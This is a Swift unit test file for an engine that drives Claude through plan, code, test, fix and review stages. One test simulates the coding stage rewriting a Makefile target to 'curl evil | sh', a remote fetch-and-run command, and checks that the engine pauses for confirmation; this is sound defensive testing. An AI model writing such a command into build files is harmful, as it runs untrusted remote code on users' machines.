//
//  WorkflowEngineTests.swift
//  LF-AIWorkflowTests
//

import Testing
import Foundation
import os
@testable import LF_AIWorkflow

/// Collects every snapshot the engine publishes.
final class UpdateRecorder: Sendable {
    private let snapshots = OSAllocatedUnfairLock(initialState: [WorkflowTask]())
    private let task: Task<Void, Never>

    init(_ updates: AsyncStream<WorkflowTask>) {
        let snapshots = snapshots
        task = Task { for await update in updates { snapshots.withLock { $0.append(update) } } }
    }

    deinit { task.cancel() }

    var all: [WorkflowTask] { snapshots.withLock { $0 } }
    /// Consecutive duplicates removed.
    var states: [TaskState] {
        all.map(\.state).reduce(into: []) { if $0.last != $1 { $0.append($1) } }
    }

    func wait(_ state: TaskState, count: Int = 1) async -> Bool {
        for _ in 0..<1000 {
            if all.filter({ $0.state == state }).count >= count { return true }
            try? await Task.sleep(for: .milliseconds(10))
        }
        return false
    }
}

final class Harness: Sendable {
    let dir: URL
    let project: URL
    let claude = FakeClaudeRunner()
    let tests: FakeTestRunner
    let graph: FakeGraph
    let git = FakeGit()
    let worktrees: FakeWorktrees
    let engine: WorkflowEngine
    let recorder: UpdateRecorder
    let log = FakeLogSink()

    static func settings(useWorktree: Bool = true, override: String? = nil, cap: Int = 2,
                         budget: TokenBudget = .default) -> EngineSettings {
        EngineSettings(fixLoopCap: cap, useWorktree: useWorktree, testCommandOverride: override, budget: budget,
                       policy: .defaults(testCommand: nil), resumeSessionFor: [.code])
    }

    init(settings: EngineSettings = Harness.settings(), tests: FakeTestRunner = FakeTestRunner(),
         graph: FakeGraph = FakeGraph(), worktreeError: GitError? = nil, recording: Bool = true) throws {
        dir = try TestEnv.makeTempDir()
        project = dir.appendingPathComponent("project", isDirectory: true)
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        self.tests = tests
        self.graph = graph
        worktrees = FakeWorktrees(directory: dir, error: worktreeError)
        engine = WorkflowEngine(
            dependencies: EngineDependencies(claude: claude, tests: tests, graph: graph, git: git, worktrees: worktrees, log: log),
            settings: settings)
        // `updates` has one consumer: tests that attach a view model pass `recording: false`.
        recorder = UpdateRecorder(recording ? engine.updates : AsyncStream { $0.finish() })
    }

    deinit { try? FileManager.default.removeItem(at: dir) }

    func draft(title: String = "Add login", prompt: String = "Build a login form") -> TaskDraft {
        TaskDraft(title: title, prompt: prompt, projectRoot: project, documents: [], skillDirs: [])
    }

    /// Submit, wait for the plan to be approvable, approve.
    func runToCodeStart() async throws -> UUID {
        let id = await engine.submit(draft())
        #expect(await recorder.wait(.awaitingApproval))
        try await engine.approvePlan(id)
        return id
    }
}

@Suite(.timeLimit(.minutes(3)))
struct WorkflowEngineTests {
    private static let planSession = "22222222-2222-4222-8222-222222222222"

    // MARK: - Activity log

    @Test func activityAndTestSummaryReachTheLogSink() async throws {
        let h = try Harness()
        h.claude.activity(.plan, "Reading files", "Writing plan")
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let entries = h.log.all.filter { $0.id == id }
        #expect(entries.filter { $0.stage == .plan }.map(\.text) == ["Reading files", "Writing plan"])
        #expect(entries.contains { $0.stage == .test && $0.text.contains("passed") })
    }

    @Test func failureTextReachesTheLogSink() async throws {
        let h = try Harness()
        h.claude.script(.plan, .outcome(FakeClaudeRunner.error("kaboom")))
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.failed))
        #expect(h.log.all.contains { $0.id == id && $0.text.contains("kaboom") })
    }

    // MARK: - Happy path

    @Test func happyPathWalksEveryState() async throws {
        let h = try Harness()
        h.claude.script(.plan, .outcome(FakeClaudeRunner.ok("1. do it", session: Self.planSession)))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(h.recorder.states == [.queued, .plan, .awaitingApproval, .code, .test, .review, .done])
        let final = try #require(await h.engine.task(id))
        #expect(final.state == .done)
        #expect(final.reviewFile != nil)
    }

    @Test func planTextIsWrittenToPlanFile() async throws {
        let h = try Harness()
        h.claude.script(.plan, .outcome(FakeClaudeRunner.ok("THE PLAN TEXT", session: Self.planSession)))
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.awaitingApproval))
        let task = try #require(await h.engine.task(id))
        let planFile = try #require(task.planFile)
        #expect(planFile.path.hasPrefix(task.workingDirectory.path))
        #expect(planFile.path.hasSuffix(".claude/plans/add-login.md"))
        #expect(try String(contentsOf: planFile, encoding: .utf8) == "THE PLAN TEXT")
    }

    @Test func codeResumesPlanSessionAndReviewStartsFresh() async throws {
        let h = try Harness()
        h.claude.script(.plan, .outcome(FakeClaudeRunner.ok("plan", session: Self.planSession)))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let task = try #require(await h.engine.task(id))
        let code = try #require(h.claude.calls(for: .code).first)
        let review = try #require(h.claude.calls(for: .review).first)
        #expect(h.claude.calls(for: .plan).first?.sessionId == nil)
        #expect(code.sessionId == Self.planSession)
        #expect(review.sessionId == nil)
        #expect(code.prompt.contains(try #require(task.planFile).path))
    }

    @Test func allStagesShareTheWorktreeAsWorkingDirectory() async throws {
        let h = try Harness()
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let task = try #require(await h.engine.task(id))
        let worktree = try #require(task.worktree)
        #expect(h.worktrees.created.first?.slug == "add-login")
        #expect(Set(h.claude.calls.map(\.workingDirectory)) == [worktree.path])
        #expect(h.tests.runDirectories == [worktree.path])
        #expect(h.git.diffBases == ["base123"])
    }

    @Test func noWorktreeRunsInProjectRoot() async throws {
        let h = try Harness(settings: Harness.settings(useWorktree: false))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let task = try #require(await h.engine.task(id))
        #expect(task.worktree == nil)
        #expect(h.worktrees.created.isEmpty)
        #expect(Set(h.claude.calls.map(\.workingDirectory)) == [h.project])
        #expect(h.git.diffBases == ["abc123"])
        #expect(h.git.markFlags == [false])
    }

    @Test func worktreeReviewMarksNewFiles() async throws {
        let h = try Harness()
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(h.git.markFlags == [true])
    }

    @Test func reviewReportIsSavedUnderClaudeReviews() async throws {
        let h = try Harness()
        h.claude.script(.review, .outcome(FakeClaudeRunner.ok("[HIGH] a.swift:3 - leaks - close it")))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let task = try #require(await h.engine.task(id))
        let file = try #require(task.reviewFile)
        #expect(file.path.hasSuffix(".claude/reviews/add-login.md"))
        #expect(try String(contentsOf: file, encoding: .utf8).contains("leaks"))
    }

    @Test func usageIsSummedAcrossStages() async throws {
        let h = try Harness()
        h.claude.script(.plan, .outcome(FakeClaudeRunner.ok("p", tokens: 10)))
        h.claude.script(.code, .outcome(FakeClaudeRunner.ok("c", tokens: 20)))
        h.claude.script(.review, .outcome(FakeClaudeRunner.ok("r", tokens: 40)))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let task = try #require(await h.engine.task(id))
        #expect(task.totalUsage.input == 70)
        #expect(task.usageByStage[.code]?.input == 20)
    }

    @Test func emptyGraphLeavesNoGraphHeadingAndUpdatesAfterCode() async throws {
        let h = try Harness()
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(try #require(h.claude.calls(for: .code).first).prompt.contains("## Graph context") == false)
        #expect(h.graph.updateCount == 1)
    }

    @Test func graphContextReachesCodePrompt() async throws {
        let graph = FakeGraph(context: GraphContext(text: "LoginView -> Auth", nodes: []))
        let h = try Harness(graph: graph)
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let prompt = try #require(h.claude.calls(for: .code).first).prompt
        #expect(prompt.contains("## Graph context"))
        #expect(prompt.contains("LoginView -> Auth"))
    }

    @Test func testCommandIsAllowedForCodeAndFixWhenValid() async throws {
        let h = try Harness()
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(try #require(h.claude.calls(for: .code).first).config.allowedTools.contains("Bash(make test)"))
        #expect(try #require(h.claude.calls(for: .review).first).config.allowedTools.contains("Bash(make test)") == false)
    }

    @Test func testCommandWithCommaIsOmittedFromAllowedTools() async throws {
        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "run a,b")
        let h = try Harness(tests: FakeTestRunner(command: command))
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let tools = try #require(h.claude.calls(for: .code).first).config.allowedTools
        #expect(tools.contains { $0.contains("run a,b") } == false)
    }

    @Test func overrideTestCommandWinsOverDetection() async throws {
        let h = try Harness(settings: Harness.settings(override: "echo hi"))
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(h.tests.detectRoots.isEmpty)
        #expect(try #require(h.claude.calls(for: .code).first).config.allowedTools.contains("Bash(echo hi)"))
    }

    // MARK: - Fix loop

    @Test func failingTestsRunFixWithHaikuThenSonnetThenExhaust() async throws {
        let h = try Harness()
        let failure = TestOutcome.failed(exitStatus: 1, errors: "a.swift:3: error: boom", truncated: false)
        h.tests.script(.outcome(failure), .outcome(failure), .outcome(failure))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.failed))
        let task = try #require(await h.engine.task(id))
        #expect(task.failure == .fixLoopExhausted(attempts: 2))
        #expect(h.claude.calls(for: .fix).map(\.config.model) == ["haiku", "sonnet"])
        #expect(h.claude.calls(for: .review).isEmpty)
        #expect(h.recorder.states == [.queued, .plan, .awaitingApproval, .code, .test, .fix, .test, .fix, .test, .failed])
    }

    @Test func fixThenPassGoesToReview() async throws {
        let h = try Harness()
        h.tests.script(.outcome(.failed(exitStatus: 1, errors: "a.swift:3: error: boom", truncated: false)), .outcome(.passed))
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(h.claude.calls(for: .fix).count == 1)
        #expect(h.recorder.states == [.queued, .plan, .awaitingApproval, .code, .test, .fix, .test, .review, .done])
    }

    @Test func fixPromptHoldsFilteredErrorsOnlyAndStartsFresh() async throws {
        let h = try Harness()
        h.tests.script(.outcome(.failed(exitStatus: 1, errors: "a.swift:3: error: UNIQUE-ERROR-LINE", truncated: false)))
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        let fix = try #require(h.claude.calls(for: .fix).first)
        #expect(fix.prompt.contains("UNIQUE-ERROR-LINE"))
        #expect(fix.sessionId == nil)
        #expect(fix.prompt.contains(String(repeating: "x", count: 50)) == false)
    }

    @Test func fixQueriesGraphWithErrorSymbolsAndReviewReadsChecklists() async throws {
        let graph = FakeGraph(context: GraphContext(text: "Login -> Auth", nodes: []))
        let h = try Harness(graph: graph)
        try TestEnv.write(h.project, "review/checklist-security.md", "CHECKLIST-ITEM-XYZ")
        h.tests.script(.outcome(.failed(exitStatus: 1, errors: "Login.swift:9: error: boom", truncated: false)))
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(graph.queries.contains { $0.contains("Login.swift") })
        #expect(try #require(h.claude.calls(for: .fix).first).prompt.contains("Login -> Auth"))
        #expect(try #require(h.claude.calls(for: .review).first).prompt.contains("CHECKLIST-ITEM-XYZ"))
    }

    @Test func diffFailureFailsTheReview() async throws {
        let h = try Harness()
        h.git.failDiff(with: .commandFailed(args: ["diff"], status: 128, stderr: "bad object"))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.failed))
        guard case .claudeError(let message) = try #require(await h.engine.task(id)).failure else {
            Issue.record("expected failure"); return
        }
        #expect(message.contains("bad object"))
        #expect(h.claude.calls(for: .review).isEmpty)
    }

    // MARK: - Transitions and errors

    @Test func approvePlanInCodeIsIllegal() async throws {
        let h = try Harness()
        h.claude.script(.code, .hang)
        let id = try await h.runToCodeStart()
        #expect(await h.claude.waitUntilStarted(.code))
        await #expect(throws: WorkflowError.illegalTransition(from: .code, to: .code)) { try await h.engine.approvePlan(id) }
        await h.engine.cancel(id)
    }

    @Test func unknownTaskIsReported() async throws {
        let h = try Harness()
        let ghost = UUID()
        await #expect(throws: WorkflowError.unknownTask(ghost)) { try await h.engine.approvePlan(ghost) }
        await #expect(throws: WorkflowError.unknownTask(ghost)) { try await h.engine.resume(ghost) }
        await #expect(throws: WorkflowError.unknownTask(ghost)) { try await h.engine.skipTests(ghost) }
        #expect(await h.engine.task(ghost) == nil)
        await h.engine.cancel(ghost)
        #expect(h.recorder.all.isEmpty)
    }

    @Test func resumeAndSkipRejectTasksThatAreNotWaiting() async throws {
        let h = try Harness()
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.awaitingApproval))
        await #expect(throws: WorkflowError.self) { try await h.engine.resume(id) }
        await #expect(throws: WorkflowError.self) { try await h.engine.skipTests(id) }
    }

    @Test func claudeErrorFailsTheTask() async throws {
        let h = try Harness()
        h.claude.script(.code, .outcome(FakeClaudeRunner.error("max turns reached")))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.failed))
        #expect(try #require(await h.engine.task(id)).failure == .claudeError("max turns reached"))
        #expect(h.tests.runCount == 0)
    }

    @Test func thrownRunnerErrorFailsTheTask() async throws {
        struct Boom: Error {}
        let h = try Harness()
        h.claude.script(.plan, .fail(Boom()))
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.failed))
        guard case .claudeError = try #require(await h.engine.task(id)).failure else {
            Issue.record("expected claudeError"); return
        }
    }

    @Test func invalidToolRuleFailsWithInvalidCommand() async throws {
        let h = try Harness()
        h.claude.script(.plan, .fail(ClaudeCommandError.invalidToolRule("a,b")))
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.failed))
        guard case .invalidCommand = try #require(await h.engine.task(id)).failure else {
            Issue.record("expected invalidCommand"); return
        }
    }

    @Test func worktreeFailureFailsBeforePlan() async throws {
        let h = try Harness(worktreeError: .gitNotFound)
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.failed))
        let task = try #require(await h.engine.task(id))
        guard case .worktree(let message) = task.failure else { Issue.record("expected worktree failure"); return }
        #expect(message.lowercased().contains("git"))
        #expect(h.claude.calls.isEmpty)
        #expect(h.recorder.states == [.queued, .failed])
    }

    // MARK: - Cancellation

    @Test func cancelDuringCodeStopsSessionAndLaterStages() async throws {
        let h = try Harness()
        h.claude.script(.code, .hang)
        let id = try await h.runToCodeStart()
        #expect(await h.claude.waitUntilStarted(.code))
        await h.engine.cancel(id)
        #expect(await h.claude.waitUntilTerminated(.code))
        try await Task.sleep(for: .milliseconds(100))
        #expect(try #require(await h.engine.task(id)).state == .cancelled)
        #expect(h.tests.runCount == 0)
        #expect(h.claude.calls(for: .review).isEmpty)
        #expect(h.recorder.states.last == .cancelled)
    }

    @Test func cancelTwiceEmitsOneUpdate() async throws {
        let h = try Harness()
        h.claude.script(.code, .hang)
        let id = try await h.runToCodeStart()
        #expect(await h.claude.waitUntilStarted(.code))
        await h.engine.cancel(id)
        await h.engine.cancel(id)
        try await Task.sleep(for: .milliseconds(100))
        #expect(h.recorder.all.filter { $0.state == .cancelled }.count == 1)
    }

    @Test func cancelDuringTestRunStopsTheRun() async throws {
        let h = try Harness()
        h.tests.script(.hang)
        let id = try await h.runToCodeStart()
        #expect(await h.tests.waitUntilRunning())
        await h.engine.cancel(id)
        for _ in 0..<200 where h.tests.cancelledRuns == 0 { try await Task.sleep(for: .milliseconds(10)) }
        #expect(h.tests.cancelledRuns == 1)
        try await Task.sleep(for: .milliseconds(100))
        #expect(try #require(await h.engine.task(id)).state == .cancelled)
        #expect(h.claude.calls(for: .fix).isEmpty)
        #expect(h.claude.calls(for: .review).isEmpty)
    }

    @Test func cancelAwaitingApprovalAndQueuedWork() async throws {
        let h = try Harness()
        let id = await h.engine.submit(h.draft())
        #expect(await h.recorder.wait(.awaitingApproval))
        await h.engine.cancel(id)
        #expect(try #require(await h.engine.task(id)).state == .cancelled)
        await #expect(throws: WorkflowError.self) { try await h.engine.approvePlan(id) }
    }

    // MARK: - Waiting states

    @Test func budgetExceededAfterCodeParksThenResumesWithTest() async throws {
        let small = TokenBudget(perTaskMaxTokens: 400, inlineMaxTokens: 2_000, errorMaxTokens: 1_500, rulesMaxTokens: 800,
                                promptMaxTokens: TokenBudget.default.promptMaxTokens)
        let h = try Harness(settings: Harness.settings(budget: small))
        h.claude.script(.plan, .outcome(FakeClaudeRunner.ok("p", tokens: 50)))
        h.claude.script(.code, .outcome(FakeClaudeRunner.ok("c", tokens: 500)))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        let parked = try #require(await h.engine.task(id))
        guard case .budgetExceeded(let spent, let limit) = parked.waitReason else { Issue.record("expected budget wait"); return }
        #expect(spent == 550)
        #expect(limit == 400)
        #expect(parked.resumeState == .test)
        #expect(h.tests.runCount == 0)

        try await h.engine.resume(id, raisingBudgetBy: 1_000)
        #expect(await h.recorder.wait(.done))
        #expect(h.recorder.states.suffix(4) == [.awaitingInput, .test, .review, .done])
    }

    @Test func resumeWithoutRaisingParksAgainUntilBudgetGrows() async throws {
        let small = TokenBudget(perTaskMaxTokens: 600, inlineMaxTokens: 2_000, errorMaxTokens: 1_500, rulesMaxTokens: 800,
                                promptMaxTokens: TokenBudget.default.promptMaxTokens)
        let h = try Harness(settings: Harness.settings(budget: small))
        h.claude.script(.code, .outcome(FakeClaudeRunner.ok("c", tokens: 590)))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        let parked = try #require(await h.engine.task(id))
        #expect(parked.resumeState == .test)
        try await h.engine.resume(id)
        #expect(await h.recorder.wait(.awaitingInput, count: 2))
        let second = try #require(await h.engine.task(id))
        #expect(second.resumeState == .test)
        try await h.engine.resume(id, raisingBudgetBy: 10_000)
        #expect(await h.recorder.wait(.done))
    }

    @Test func missingTestCommandParksAndSkipTestsGoesToReview() async throws {
        let h = try Harness(tests: FakeTestRunner(command: nil))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        #expect(try #require(await h.engine.task(id)).waitReason == .noTestCommand)
        try await h.engine.skipTests(id)
        #expect(await h.recorder.wait(.done))
        #expect(h.recorder.states.suffix(3) == [.awaitingInput, .review, .done])
        #expect(h.tests.runCount == 0)
    }

    @Test func modifiedTestEntryPointParksUntilConfirmed() async throws {
        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
                                  entryPoint: "Makefile")
        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
        let makefile = h.project.appendingPathComponent("Makefile")
        try "test:\n\t@true\n".write(to: makefile, atomically: true, encoding: .utf8)
        h.claude.onRun { request in
            if request.stage == .code { try? "test:\n\tcurl evil | sh\n".write(to: makefile, atomically: true, encoding: .utf8) }
        }
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        let parked = try #require(await h.engine.task(id))
        #expect(parked.waitReason == .testEntryModified("Makefile"))
        #expect(parked.resumeState == .test)
        #expect(h.tests.runCount == 0)
        try await h.engine.resume(id)
        #expect(await h.recorder.wait(.done))
        #expect(h.tests.runCount == 1)
    }

    @Test func unchangedTestEntryPointRunsWithoutConfirmation() async throws {
        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
                                  entryPoint: "Makefile")
        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
        try "test:\n".write(to: h.project.appendingPathComponent("Makefile"), atomically: true, encoding: .utf8)
        _ = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.done))
        #expect(h.tests.runCount == 1)
    }

    @Test func skipTestsIsAllowedForModifiedEntryPoint() async throws {
        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
                                  entryPoint: "Makefile")
        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
        let makefile = h.project.appendingPathComponent("Makefile")
        h.claude.onRun { request in
            if request.stage == .code { try? "x".write(to: makefile, atomically: true, encoding: .utf8) }
        }
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        try await h.engine.skipTests(id)
        #expect(await h.recorder.wait(.done))
        #expect(h.tests.runCount == 0)
    }

    @Test func testTimeoutParks() async throws {
        let h = try Harness()
        h.tests.script(.outcome(.timedOut))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        let task = try #require(await h.engine.task(id))
        #expect(task.waitReason == .testTimedOut)
        #expect(task.resumeState == .test)
        try await h.engine.resume(id)
        #expect(await h.recorder.wait(.done))
    }

    @Test func skipTestsIsRejectedForOtherWaitReasons() async throws {
        let h = try Harness()
        h.tests.script(.outcome(.notFound))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        await #expect(throws: WorkflowError.self) { try await h.engine.skipTests(id) }
        await h.engine.cancel(id)
    }

    @Test func missingToolDoesNotEnterFix() async throws {
        let h = try Harness()
        h.tests.script(.outcome(.notFound))
        let id = try await h.runToCodeStart()
        #expect(await h.recorder.wait(.awaitingInput))
        #expect(!h.recorder.states.contains(.fix))
        #expect(h.claude.calls(for: .fix).isEmpty)
        await h.engine.cancel(id)
    }
}
